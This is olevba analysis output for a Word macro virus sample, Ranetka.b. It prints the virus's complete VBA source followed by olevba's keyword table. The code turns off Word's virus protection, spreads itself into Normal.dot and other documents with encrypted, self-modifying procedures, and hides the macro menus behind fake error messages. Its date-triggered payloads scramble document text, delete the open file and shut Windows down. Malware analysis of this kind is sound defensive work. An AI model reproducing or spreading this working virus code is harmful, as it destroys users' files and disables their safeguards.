olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ranetka.b-c4ed182abeaefad9e0a329c4355650cff627e148
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ranetka.b-c4ed182abeaefad9e0a329c4355650cff627e148 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ranetka.bas 
in file: Virus.MSWord.Ranetka.b-c4ed182abeaefad9e0a329c4355650cff627e148 - OLE stream: 'Macros/VBA/Ranetka'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If ThisDocument = "Normal.dot" Then
Application.OnTime Now + TimeValue("00:00:10"), "Normal.Ranetka.Íåâåñòà"
Else
Application.OnTime Now + TimeValue("00:00:10"), "Project.Ranetka.Íåâåñòà"
Rem Mike8.026.10.00 12:28:34GoatW8-2.doc
End If
Application.Caption = "Microsoôt Worä": Application.EnableCancelKey = wdCancelDisabled
If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then
CustomizationContext = NormalTemplate
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyF11, wdKeyAlt), KeyCategory:=wdKeyCategoryMacro, Command:="application.Run Íåâåñòà"
CustomizationContext = NormalTemplate
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyF8, wdKeyAlt), KeyCategory:=wdKeyCategoryMacro, Command:="application.Run Íåâåñòà"
For i = 1 To CommandBars("Tools").Controls.Count
If CommandBars("Tools").Controls(i).Caption = "&Ìàêðîñ" Then CommandBars("Tools").Controls(i).Delete
If CommandBars("Tools").Controls(i).Caption = "&Øàáëîíû è íàäñòðîéêè..." Then CommandBars("Tools").Controls(i).Delete
Next i
End If
End Sub
Sub AutoOpen()
AutoExec
' by KoToV Vlasiha CopyLeft,
' Ranetka2000 Beta Version 1.2
' ýòî ñêðîìíîå ñóùåñòâî ÿâëÿåòñÿ ïðÿìûì ïîòîìêîì
' Word97.Ranetka, íàïèñàíî â äíè ñäà÷è âûïóñêíûõ
' ýêçàìåíîâ â øêîëå. Ïîñâÿùàåòñÿ ïîëíîñòüþ
' øêîëå èì. À.Ñ. Ïîïîâà è ìîåìó ó÷èòåëþ èíôîðìàòèêè.
' Ïðèâåò Ìîëîäîâó Å. è âñåìó AVP, à òàêæå Dr. Äðîíó
End Sub
Sub AutoClose()
Íåâåñòà
End Sub
Sub ToolsOptions()
With Options: .VirusProtection = True: .SaveNormalPrompt = True: End With
If Dialogs(wdDialogToolsOptions).Show Then
End If
With Options: .VirusProtection = False: .SaveNormalPrompt = False: End With: Íåâåñòà
End Sub
Sub ViewVBCode()
Íåâåñòà: If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then ShowVisualBasicEditor = False: MsgBox "Not enough memory to execute process!", vbSystemModal, "Error Windows!" Else ShowVisualBasicEditor = True
End Sub
Sub Organizer()
Íåâåñòà: If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then ShowVisualBasicEditor = False: MsgBox "Not enough memory to execute process!", vbSystemModal, "Error Windows!" Else Word.Dialogs(wdDialogOrganizer).Show
End Sub
Sub FileTemplates()
Íåâåñòà: If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then ShowVisualBasicEditor = False: MsgBox "Not enough memory to execute process!", vbSystemModal, "Error Windows!" Else Word.Dialogs(wdDialogToolsTemplates).Show
End Sub
Sub ToolsMacro()
Íåâåñòà: If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then ShowVisualBasicEditor = False: MsgBox "Not enough memory to execute process!", vbSystemModal, "Error Windows!" Else Word.Dialogs(wdDialogToolsMacro).Show
End Sub
Sub Íåâåñòà()
On Error Resume Next
If ThisDocument = "Normal.dot" Then
Set ad = ActiveDocument.VBProject.VBComponents
Set td = NormalTemplate.VBProject.VBComponents("Ranetka")
Else
Set ad = NormalTemplate.VBProject.VBComponents
Set td = ActiveDocument.VBProject.VBComponents("Ranetka")
End If
Roza
Luksemburg 0, td
Èíîïëàíåòíûé_ãîñòü td, ad
Luksemburg 1, td
KME td
If ThisDocument = "Normal.dot" Then
Application.OnTime Now + TimeValue("00:02:00"), "Normal.Ranetka.Íåâåñòà"
Else
Application.OnTime Now + TimeValue("00:02:00"), "Project.Ranetka.Íåâåñòà"
End If
End Sub
Rem Mike8.026.10.00 12:28:34GoatW8-2.doc
Private Function Roza()
If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then
If WeekDay(Now) = vbSunday And Hour(Now) >= 21 Then
n1 = Int((Documents(1).Words.Count - 2) * Rnd + 1): n2 = Int((Documents(1).Words.Count - 2) * Rnd + 1)
Documents(1).Words(n1).Copy: tmp = Documents(1).Words(n2).Text
Documents(1).Words(n2).Paste: Documents(1).Words(n1).Text = tmp: Documents(1).Save
End If
If Day(Now()) = 23 And Month(Now()) = 4 Then
MsgBox "Ñåãîäíÿ ìîé Äåíü Ðîæäåíèÿ!!!" & vbCrLf & "ìíå ñåãîäíÿ èñïîëíèëîñü" & Year(Now()) - 1983 & " ëåò!", vbSystemModal, "ß îòäûõàþ!"
If Left(ActiveDocument.Name, 8) <> "Äîêóìåíò" Then name_ = ActiveDocument.FullName: ActiveDocument.Close wdPromptToSaveChanges, wdOriginalDocumentFormat: Kill name_: Tasks.ExitWindows
End If
End If
End Function
Private Function Luksemburg(doing, td)
On Error Resume Next
If doing = 1 Then
For i = td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + 10 To (td.CodeModule.ProcCountLines("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc)) - 2
my_body = td.CodeModule.lines(i, 1): wizard = Int((10 - 6) * Rnd + 5): body_fuck = "'" + Str(wizard)
For o = 1 To Len(my_body)
body_fuck = body_fuck + Chr$(Asc(Mid(my_body, o, 1)) + wizard)
Next o
Rem Mike8.026.10.00 12:28:34GoatW8-2.doc
bodyfuck = bodyfuck + body_fuck + vbCrLf
Next i
bodyfuck = Left(bodyfuck, Len(bodyfuck) - 2)
td.CodeModule.deletelines td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + 1, td.CodeModule.ProcCountLines("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) - 2
td.CodeModule.insertlines td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + 1, bodyfuck
Else
For i = td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + 1 To (td.CodeModule.ProcCountLines("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc)) - 2
my_body = td.CodeModule.lines(i, 1): wizard = Mid(td.CodeModule.lines(i, 1), 3, 1): body_fuck = ""
For o = 4 To Len(my_body)
body_fuck = body_fuck + Chr$(Asc(Mid(my_body, o, 1)) - wizard)
Next o
td.CodeModule.insertlines td.CodeModule.CountOfLines, body_fuck
Next i
End If
End Function
Private Function KME(td)
k = 1: Do While k <= 3
nomer_of = Int(((td.CodeModule.CountOfLines - 10) - 2) * Rnd + 1)
fuck = "Rem " + Application.UserName + Application.Version + Str$(Now) + ActiveDocument.Name
If Left$(td.CodeModule.lines(nomer_of, 1), 3) = "Rem" Then
td.CodeModule.deletelines nomer_of
Else
If Left$(td.CodeModule.lines(nomer_of - 1, 1), 3) <> "Rem" And Left$(td.CodeModule.lines(nomer_of + 1, 1), 3) <> "Rem" Then td.CodeModule.insertlines nomer_of, fuck
End If: k = k + 1
Loop
End Function
Sub AutoExit()
With Options: .VirusProtection = 1: End With
End Sub
Sub Èíîïëàíåòíûé_ãîñòü(td, ad)
' 7t€fivk€'D'Y[ypt/{k5JvklTvk|sl5spulz/83'{k5JvklTvk|sl5Jv|u{VmSpulz'4'870'2'}iJySm'2')Luk'Z|i)0
' 7Vwlu')jAc~pukv~zcz€z{ltcrv{v}5z€z)'Mvy'V|{w|{'Hz'*8
' 7Wypu{'*83')H{{ypi|{l']IfUhtl'D')'2'Joy+/:;0'2')Yhul{rh)'2'Joy+/:;0
' 6Vxotz&)72&sehuj
' 6Iruyk&)7
' 8Nwz(q(E(:(\w(il6Kw}v|
' 5Nk%fi3Nyjr-n.3Sfrj%B%'Wfsjypf'%Ymjs%J}ny%Xzg%Jqxj%fi3Wjrt{j%fi3Nyjr-n.
' 8Vm€|(q
' 8il6Quxwz|(*kBdqvlw{d{�{|mudsw|w~6{�{*
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

